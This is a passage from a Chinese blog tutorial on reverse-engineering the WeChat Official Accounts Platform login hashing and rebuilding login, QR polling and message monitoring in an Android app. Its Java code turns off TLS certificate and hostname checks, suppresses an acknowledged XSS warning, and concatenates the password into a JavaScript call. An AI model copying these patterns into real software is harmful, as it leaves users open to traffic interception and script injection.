<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">u</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">unescape</span>(<span class="built_in">encodeURIComponent</span>(n))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a(i(h(n), <span class="number">8</span> * n.length))</span><br><span class="line">  &#125;(u(n))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到u是一个硬编码，没啥太大的意思，而o里面又有三个嵌套函数，首先是h再是i，最后是a，将其返回回去，跟进h函数：<br><img src="img7.jpg" alt="h函数"><br>有是一个硬编码，没啥他太大的意思，继续回到o函数，再进入i函数，<br><img src="img8.jpg" alt="i函数"><br>这个就有点意思，因为h返回给的是一个数组，所以这里接收到了一个数组和密码长度的8倍，然后进行了一大顿的操作，这有一个坑我等下回过头来说，看完i之后我们继续往下看a函数：<br><img src="img9.jpg" alt="a函数"><br>还是和之前一样，没啥意思，就是这么转了一大顿而已，好了o函数出来了，我们跟进e函数：<br><img src="img10.jpg" alt="e函数"><br>这个也比较简单，反正跟着他来写就好了，但是这里还有一个坑，就是这个n参数，可以看到我们根本看不到是什么，是一段乱码，所以我们只能嵌套处理，好了分析完毕之后，跟出去发现确实是我们的pwd参数所需要的内容。</p>
<p>好了我们整体进行分析，首先我们截取前十七个字符，然后传递给r函数，由于微信这里这个加密可能是为后期为维护做一个所谓的：高聚合低耦合 所实现的铺垫，所以他在这个r函数中我们只可能到最后一个switch条件下面，然后调用o函数，o函数中又嵌套调用了：h，i，a函数，h的参数是u函数的返回值，最后返回给e函数再次嵌套调用，e函数的返回值就是我们的pwd参数，这里有个坑我给你们填一下，这个i函数其实在内部调用了好多函数，但是为了不给文章阅读者带来压力我就没截图，但是这都不重要，最后我们可以根据他的算法编写这样的一个自定义function：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wechajiami</span>(<span class="params">n</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   mm=n.substr(<span class="number">0</span>, <span class="number">16</span>)</span><br><span class="line">   <span class="keyword">return</span> e(a(i(h(mm), <span class="number">8</span> * mm.length)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只要传进n给这个函数，最后返回的就是密码的加密，我们测试一下：<br><img src="img11.jpg" alt="自定义函数执行"><br>确实使我们的加密密码：45ebabf1cfa6670dbc5dac1ca48842b4<br>所以我们js加密这块就解决了，然后我们来看返回值：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"base_resp"</span>:&#123;<span class="attr">"err_msg"</span>:<span class="string">"ok"</span>,<span class="attr">"ret"</span>:<span class="number">0</span>&#125;,<span class="attr">"redirect_url"</span>:<span class="string">"/cgi-bin/bizlogin?action=validate&amp;lang=zh_CN&amp;account=3311736869%40qq.com"</span>&#125;</span><br></pre></td></tr></table></figure>
<p>这里我就不给大家看失败的了，我直接说了，这个base_resp对象下面的err_msg属性是我们的重要一点，这里如果是ok代表登录成功，还有很多，比如说需要输入验证码，验证码错误，密码错误的情况，这里我就不提了，好了简单分析完毕之后，我们需要先来写程序实现一下：<br>布局什么的我就不提了，安卓的权限不要忘记就好。<br>安卓进行js加密是很麻烦的，我们需要借助浏览的回调进行读取，所以我们首先需要编写html代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wechatjiami</span>(<span class="params">n</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   mm=n.substr(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">   android.toastMessage(e(a(i(h(mm), <span class="number">8</span> * mm.length))));</span><br><span class="line">   <span class="keyword">return</span> <span class="string">"yes"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到我这里用了个android.toastMessage这个方法，这个是用来通讯的，名称使我们自己定义的，需要在安卓中进行编写。<br>我们先定义一个<code>WeChatLogin</code>类，专门用来管理微信登录的，全部函数都在这里面，在构造函数的时候我们初始化js加密，这里我没有用单例模式，是因为需要上下文：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SuppressLint</span>(<span class="string">"SetJavaScriptEnabled"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">WeChatLogin</span><span class="params">(Context c)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">this</span>.context=c;</span><br><span class="line">	webview = <span class="keyword">new</span> WebView(context);  <span class="comment">//实例化浏览器</span></span><br><span class="line">	webview.loadUrl(<span class="string">"file:///android_asset/wechat.html"</span>);  <span class="comment">//加载资源文件</span></span><br><span class="line">	webview.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);<span class="comment">//设置JS可用</span></span><br><span class="line">    webview.setWebChromeClient(<span class="keyword">new</span> WebChromeClient() &#123;&#125;);</span><br><span class="line">    webview.addJavascriptInterface(<span class="keyword">new</span> MyJs(), <span class="string">"android"</span>);<span class="comment">//接口化类</span></span><br><span class="line">    webview.setWebViewClient(<span class="keyword">new</span> WebViewClient() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onPageFinished</span><span class="params">(WebView view, String url)</span> </span>&#123;<span class="comment">//当页面加载完成时就调用js函数</span></span><br><span class="line">            <span class="keyword">super</span>.onPageFinished(view, url);</span><br><span class="line">            isJsLoadEnd = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码比较固定，只是有个<code>MyJs</code>类是我们自己写，然后写一个<code>toastMessage</code>方法回调js解密结果的，在asset文件夹中放我们的加密HTML，然后加载他，大家可以注意有这个注解：<code>@SuppressLint(&quot;SetJavaScriptEnabled&quot;)</code>，这个注解是用来压制我们XSS漏洞的，因为我们会调用js代码，所以很容易导致XSS漏洞，其实确实是这样的，但是我们这是自己给自己用，所以压制就行了。然后我们编写登录方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">SendWeChatjiami</span><span class="params">(String pass)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">new</span> AsyncTask&lt;String, Void, String&gt;() &#123;</span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="function"><span class="keyword">protected</span> String <span class="title">doInBackground</span><span class="params">(String... params)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">while</span>(!isJsLoadEnd)&#123;&#125;</span><br><span class="line">			<span class="keyword">return</span> params[<span class="number">0</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onPostExecute</span><span class="params">(String result)</span> </span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			webview.loadUrl(<span class="string">"javascript:wechatjiami('"</span>+result+<span class="string">"')"</span>); </span><br><span class="line">		&#125;;</span><br><span class="line">		</span><br><span class="line">	&#125;.execute(pass);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Login</span><span class="params">(String username,String password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">this</span>.username = username;</span><br><span class="line">	SendWeChatjiami(password);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们调用<code>Login方法</code>，然后传递给<code>SendWeChatjiami</code>这个方法，为什么我们要保存用户名呢？我们之后要多次用到，这里先不提及，加密方法，我用了异步执行，等待浏览器加载完毕之后，我们执行js：<code>javascript:wechatjiami(&#39;&quot;+result+&quot;&#39;)&quot;</code>调用我们编写的js，js执行完毕之后我们会回调MyJs这个类中的方法，所以MyJs是我们的关键代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyJs</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@android</span>.webkit.JavascriptInterface</span><br><span class="line">	<span class="comment">//真正的登录操作</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">toastMessage</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">		<span class="comment">//运行到这个地方代表我们就是获取到了信息</span></span><br><span class="line">		<span class="keyword">new</span> AsyncTask&lt;String, Void, String&gt;()</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">protected</span> String <span class="title">doInBackground</span><span class="params">(String... params)</span> </span>&#123;</span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">					URL url = <span class="keyword">new</span> URL(<span class="string">"https://mp.weixin.qq.com/cgi-bin/bizlogin?action=startlogin"</span>);</span><br><span class="line">					HttpURLConnection connection = (HttpURLConnection)url.openConnection();</span><br><span class="line">					connection.setConnectTimeout(<span class="number">5000</span>);<span class="comment">//连接超时</span></span><br><span class="line">					connection.setReadTimeout(<span class="number">5000</span>);<span class="comment">//read读取异常</span></span><br><span class="line">					connection.setDoInput(<span class="keyword">true</span>);</span><br><span class="line">					connection.setDoOutput(<span class="keyword">true</span>);</span><br><span class="line">					connection.setRequestMethod(<span class="string">"POST"</span>);</span><br><span class="line">					connection.setRequestProperty(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">					connection.setRequestProperty(<span class="string">"X-Requested-With"</span>,<span class="string">"XMLHttpRequest"</span>);</span><br><span class="line">					connection.setRequestProperty(<span class="string">"Referer"</span>,<span class="string">"https://mp.weixin.qq.com/"</span>);</span><br><span class="line">					connection.setRequestProperty(<span class="string">"Accept-Encoding"</span>,<span class="string">"gzip, deflate, br"</span>);</span><br><span class="line">					connection.setRequestProperty(<span class="string">"Origin"</span>,<span class="string">"https://mp.weixin.qq.com"</span>);</span><br><span class="line">					OutputStream os = connection.getOutputStream();</span><br><span class="line">					os.write((<span class="string">"username="</span>+params[<span class="number">0</span>]+<span class="string">"&amp;pwd="</span>+params[<span class="number">1</span>]+<span class="string">"&amp;imgcode=&amp;f=json&amp;userlang=zh_CN&amp;redirect_url=&amp;token=&amp;lang=zh_CN&amp;ajax=1"</span>).getBytes(<span class="string">"UTF-8"</span>));</span><br><span class="line">					os.close();</span><br><span class="line">					</span><br><span class="line">					<span class="keyword">if</span>(connection.getResponseCode() == <span class="number">200</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(connection.getInputStream()));</span><br><span class="line">						String str;</span><br><span class="line">						StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">						<span class="keyword">while</span>((str=br.readLine())!=<span class="keyword">null</span>)</span><br><span class="line">						&#123;</span><br><span class="line">							sb.append(str);</span><br><span class="line">						&#125;</span><br><span class="line">						br.close();</span><br><span class="line">						Cookie=<span class="string">""</span>;</span><br><span class="line">						Map&lt;String, List&lt;String&gt;&gt; heraders = connection.getHeaderFields();</span><br><span class="line">                        <span class="keyword">for</span> (String s : heraders.get(<span class="string">"Set-Cookie"</span>)) &#123;</span><br><span class="line">                        	Cookie+=(s.split(<span class="string">";"</span>)[<span class="number">0</span>]+<span class="string">";"</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span> sb.toString();</span><br><span class="line">					&#125;</span><br><span class="line">				&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">					e.printStackTrace();</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onPostExecute</span><span class="params">(String result)</span> </span></span><br><span class="line"><span class="function">			</span>&#123;</span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">					JSONObject jsonObject = <span class="keyword">new</span> JSONObject(result).getJSONObject(<span class="string">"base_resp"</span>);</span><br><span class="line">					isLoginEnd=<span class="keyword">true</span>;</span><br><span class="line">					<span class="keyword">if</span>(!jsonObject.getString(<span class="string">"err_msg"</span>).equals(<span class="string">"ok"</span>))</span><br><span class="line">					&#123;</span><br><span class="line">						Toast.makeText(context, <span class="string">"登錄失敗！"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">					&#125;</span><br><span class="line">					</span><br><span class="line">				&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">					Toast.makeText(context, <span class="string">"登錄失敗！"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">					e.printStackTrace();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;;</span><br><span class="line">			</span><br><span class="line">		&#125;.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR,username,password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里可以看到，很简单，就是一个IO的操作，只不过要注意的是，我们的账号需要UTF-8编码，这里需要注意的是AsyncTask这个类要执行多线程在线程池的操作需要使用线程池的<code>executeOnExecutor</code>，其他的我是用Toast进行提示密码失败的，登录完毕之后我们将isLoginEnd=true，然后设置我们的Cookie，这样我们的第一步登录就完毕了，下面是二维码。</p>
<h3 id="二维码与心跳包"><a href="#二维码与心跳包" class="headerlink" title="二维码与心跳包"></a>二维码与心跳包</h3><p>微信还是用的心跳包，不算太恶心，验证码的图片地址是：<code>https://mp.weixin.qq.com/cgi-bin/loginqrcode?action=getqrcode&amp;param=4300&amp;rd=307</code>，抓包很容易抓到，第一个param参数是固定的，在js中可以看到：<br><img src="img12.jpg" alt="param参数"><br>而后面的rd是一个随机数，这里随便填写一个就好，不重要。<br>然后微信的话呢心跳包还是比较好分析的：<br><code>https://mp.weixin.qq.com/cgi-bin/loginqrcode?action=ask&amp;token=&amp;lang=zh_CN&amp;f=json&amp;ajax=1</code><br>返回值是这个样子的：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"acct_size"</span>:<span class="number">0</span>,<span class="attr">"base_resp"</span>:&#123;<span class="attr">"err_msg"</span>:<span class="string">"ok"</span>,<span class="attr">"ret"</span>:<span class="number">0</span>&#125;,<span class="attr">"status"</span>:<span class="number">0</span>,<span class="attr">"user_category"</span>:<span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure>
<p>最重要的是status这个属性，简单的分析你会发现，0是没扫描，4是扫描了但是没登录，1是登录成功，登录成功之后他就会访问这个样子的一个URL：<code>https://mp.weixin.qq.com/cgi-bin/bizlogin?action=login</code>使用POST的方式进行提交，参数的话呢<code>userlang=zh_CN&amp;redirect_url=&amp;token=&amp;lang=zh_CN&amp;f=json&amp;ajax=1</code>没有改变，但是返回值比较重要：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"base_resp"</span>:&#123;<span class="attr">"err_msg"</span>:<span class="string">"ok"</span>,<span class="attr">"ret"</span>:<span class="number">0</span>&#125;,<span class="attr">"redirect_url"</span>:<span class="string">"/cgi-bin/home?t=home/index&amp;lang=zh_CN&amp;token=XXXXXXXXX"</span>&#125;</span><br></pre></td></tr></table></figure>
<p>这个token，我这里我用X代替了，这个东西很重要，是我们后续操作的一个基础。</p>
<p>这里有一点很重要：他基本在除了二维码没有重置Cookie之外，基本每一步都会重新设置我们的Cookie，所以为了我们后续代码能够很好的编写，我写了这么一个方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">GetCookie</span><span class="params">(String oldCookie,Map&lt;String, List&lt;String&gt;&gt; headers)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	String result=<span class="string">""</span>;</span><br><span class="line">	String[] oldCookies = oldCookie.split(<span class="string">";"</span>);</span><br><span class="line">	Map&lt;String, String&gt;tmpCookie = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;oldCookies.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		tmpCookie.put(oldCookies[i].substring(<span class="number">0</span>,oldCookies[i].indexOf(<span class="string">"="</span>)), oldCookies[i].substring(oldCookies[i].indexOf(<span class="string">"="</span>)+<span class="number">1</span>));</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">for</span> (String s : headers.get(<span class="string">"Set-Cookie"</span>)) &#123;</span><br><span class="line">    	String value = s.split(<span class="string">";"</span>)[<span class="number">0</span>];</span><br><span class="line">    	tmpCookie.put(value.substring(<span class="number">0</span>,value.indexOf(<span class="string">"="</span>)), value.substring(value.indexOf(<span class="string">"="</span>)+<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(String key:tmpCookie.keySet())</span><br><span class="line">    &#123;</span><br><span class="line">    	result+=(key+<span class="string">"="</span>+tmpCookie.get(key)+<span class="string">";"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用来覆盖我们需要重新设置的Cookie，怎么使用等下说。<br>我们到这里基本上算登录成功，还有一个就是进入主页面，他的这个页面URL：<br><code>https://mp.weixin.qq.com/cgi-bin/home?t=home/index&amp;lang=zh_CN&amp;token=XXXXXXXXX</code><br>是根据我们token进行配置的，从这个页面中可以获取一些关键信息，我只获取了用户名：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Pattern pattern = Pattern.compile(<span class="string">"wx.cgiData.nick_name = \"(.*?)\";"</span>);</span><br><span class="line">Matcher matcher = pattern.matcher(sb.toString());</span><br><span class="line"><span class="keyword">if</span>(matcher.find())</span><br><span class="line">&#123;</span><br><span class="line">	WeChatName = matcher.group(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">isRealLogin = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> WeChatName;</span><br></pre></td></tr></table></figure>
<p>这样就可以获取到用户名，这些POST和GET操作的代码我就不贴出来了，因为太长了，而且基本一样，根据我上面写的，应该很简单就写出来了。</p>
<h3 id="信息监控"><a href="#信息监控" class="headerlink" title="信息监控"></a>信息监控</h3><p>既然我们已经登陆完毕了，那么我们就可以进行信息的监控了，信息管理的页面是这个：<br><code>https://mp.weixin.qq.com/cgi-bin/message?t=message/list&amp;count=20&amp;day=7&amp;token=XXXXXXXXX&amp;lang=zh_CN</code><br>关键的是我们的token和前面的count和day，很简单，token是我们之前的，而count是我们要查看的数目，day是我们要查看最近几天的，这里我觉得默认就好了。<br>但是你可能在分析的时候不是很好分析，因为这个文件太大了，我也是找了很久才找到，这里我贴一下关键的页面内容：<br><img src="img13.jpg" alt="关键提取内容"><br>可以看到他信息是在一个对象里面的，我们用正则提取：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">GetMessageJson</span><span class="params">(String str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Pattern pattern = Pattern.compile(<span class="string">"list : \\((.*?)\\).msg_item"</span>);</span><br><span class="line">	Matcher matcher = pattern.matcher(str);</span><br><span class="line">	<span class="keyword">while</span>(matcher.find())&#123;</span><br><span class="line">		<span class="keyword">return</span> matcher.group(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很简单提取出来之后，我们可以来解析这个json：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> List&lt;MessageStruct&gt;getMessageJsonResult(String str) <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">	JSONObject AlJo = <span class="keyword">new</span> JSONObject(str);</span><br><span class="line">	JSONArray ja = AlJo.getJSONArray(<span class="string">"msg_item"</span>);</span><br><span class="line">	List&lt;MessageStruct&gt; tmplist = <span class="keyword">new</span> ArrayList&lt;MessageStruct&gt;();</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;ja.length();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">		JSONObject jo = ja.getJSONObject(i);</span><br><span class="line">		MessageStruct tmpMessage = <span class="keyword">new</span> MessageStruct();</span><br><span class="line">		tmpMessage.Name = jo.getString(<span class="string">"nick_name"</span>);</span><br><span class="line">		tmpMessage.fakeid = jo.getString(<span class="string">"fakeid"</span>);</span><br><span class="line">		tmpMessage.id = jo.getString(<span class="string">"id"</span>);</span><br><span class="line">		tmpMessage.pictureUrl = jo.getString(<span class="string">"small_headimg_url"</span>);</span><br><span class="line">		tmpMessage.message = <span class="string">"图片消息"</span>;</span><br><span class="line">		<span class="keyword">if</span>(jo.getString(<span class="string">"type"</span>).equals(<span class="string">"1"</span>))<span class="comment">//正常消息</span></span><br><span class="line">		&#123;</span><br><span class="line">			tmpMessage.message = jo.getString(<span class="string">"content"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		tmplist.add(tmpMessage);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> tmplist;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里有几个关键的内容我需要讲一下fakeid和id这个是发信息的人的一个关键标识符，通过这两个信息可以给我他回复消息，我们需要保存，type是他发信息的类型，不是1代表是图片之类的，是1代表文字，我这里用了个内部类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MessageStruct</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> String Name;</span><br><span class="line">	<span class="keyword">public</span> String message;</span><br><span class="line">	<span class="keyword">public</span> String fakeid;</span><br><span class="line">	<span class="keyword">public</span> String id;</span><br><span class="line">	<span class="keyword">public</span> String pictureUrl;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> Name + <span class="string">"说:"</span> + message;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>信息获取完毕之后，这里其实还有一个心跳包，是用来监视有没有新的信息的：<br><code>https://mp.weixin.qq.com/cgi-bin/getnewmsgnum?f=json&amp;t=ajax-getmsgnum&amp;lastmsgid=500000170&amp;filterivrmsg=&amp;filterspammsg=&amp;token=XXXXXXXXX&amp;lang=zh_CN</code><br>和之前一样，但是多了一个lastmsgid这个参数，这个参数是一你要查询哪一条信息之后的最新消息，我们不是太需要，不填写代表是最新的，他的一个返回值：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"base_resp"</span>:&#123;<span class="attr">"ret"</span>:<span class="number">0</span>,<span class="attr">"err_msg"</span>:<span class="string">"ok"</span>&#125;,<span class="attr">"newTotalMsgCount"</span>:<span class="number">0</span>,<span class="attr">"new_comment_count"</span>:<span class="number">0</span>,<span class="attr">"new_reward_count"</span>:<span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure>
<p>最重要的就是<code>newTotalMsgCount</code>这个属性，他代表最新的更新有几条，我们可以通过这个参数进行判断：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">GetMessageStatus</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	URL urlG = <span class="keyword">new</span> URL(<span class="string">"https://mp.weixin.qq.com/cgi-bin/getnewmsgnum?f=json&amp;t=ajax-getmsgnum&amp;filterivrmsg=&amp;filterspammsg=&amp;token="</span>+token+<span class="string">"&amp;lang=zh_CN"</span>);</span><br><span class="line">	HttpURLConnection connection = (HttpURLConnection)urlG.openConnection();</span><br><span class="line">	connection.setConnectTimeout(<span class="number">5000</span>);<span class="comment">//连接超时</span></span><br><span class="line">	connection.setReadTimeout(<span class="number">5000</span>);<span class="comment">//read读取异常</span></span><br><span class="line">	connection.setDoInput(<span class="keyword">true</span>);</span><br><span class="line">	connection.setRequestMethod(<span class="string">"GET"</span>);</span><br><span class="line">	connection.setRequestProperty(<span class="string">"User-Agent"</span>,<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"</span>);</span><br><span class="line">	connection.setRequestProperty(<span class="string">"Upgrade-Insecure-Requests"</span>,<span class="string">"1"</span>);</span><br><span class="line">	connection.setRequestProperty(<span class="string">"Cookie"</span>,Cookie);</span><br><span class="line">	<span class="keyword">if</span>(connection.getResponseCode() == <span class="number">200</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		String str;</span><br><span class="line">		BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(connection.getInputStream()));</span><br><span class="line">		StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">		<span class="keyword">while</span>((str=br.readLine())!=<span class="keyword">null</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			sb.append(str);</span><br><span class="line">		&#125;</span><br><span class="line">		br.close();</span><br><span class="line">		Cookie = GetCookie(Cookie,connection.getHeaderFields());</span><br><span class="line">		JSONObject jo = <span class="keyword">new</span> JSONObject(sb.toString());</span><br><span class="line">		<span class="keyword">return</span> jo.getString(<span class="string">"newTotalMsgCount"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们返回回去只要不是零我们就刷新最新消息，然后将返回的个数进行一个遍历，然后通过我的内部类结构进行一个消息的回复。<br>上面有一个坑，就是在我们获取信息的时候有一个问题，就是他总是会出现HTTPS的异常，我们需要忽略证书问题：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">URL urlG = <span class="keyword">new</span> URL(messageURL);</span><br><span class="line">		HttpsURLConnection connection = (HttpsURLConnection)urlG.openConnection();</span><br><span class="line">		</span><br><span class="line">		connection.setHostnameVerifier(<span class="keyword">new</span> HostnameVerifier() &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">verify</span><span class="params">(String hostname, SSLSession session)</span> </span>&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">TrustManager[] trustAllCerts = <span class="keyword">new</span> TrustManager[]&#123;</span><br><span class="line">		<span class="keyword">new</span> X509TrustManager() &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="keyword">public</span> X509Certificate[] getAcceptedIssuers() &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">new</span> X509Certificate[]&#123;&#125;;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkServerTrusted</span><span class="params">(X509Certificate[] chain, String authType)</span> <span class="keyword">throws</span> CertificateException </span>&#123;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkClientTrusted</span><span class="params">(X509Certificate[] chain, String authType)</span> <span class="keyword">throws</span> CertificateException </span>&#123;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	SSLContext sc = SSLContext.getInstance(<span class="string">"TLS"</span>);</span><br><span class="line">	sc.init(<span class="keyword">null</span>, trustAllCerts, <span class="keyword">new</span> SecureRandom());</span><br><span class="line">	HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());</span><br><span class="line">&#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">	e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要信任所有的域名，然后才会正常获取，并且有一个协议头不要忘记：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">connection.setRequestProperty(<span class="string">"Upgrade-Insecure-Requests"</span>,<span class="string">"1"</span>);</span><br></pre></td></tr></table></figure>
<p>这个是用来接收HTTPS完整信息的。<br>并且你会发现，有很多的协议头中必须用到Referer，而这个值一般的格式：</p>
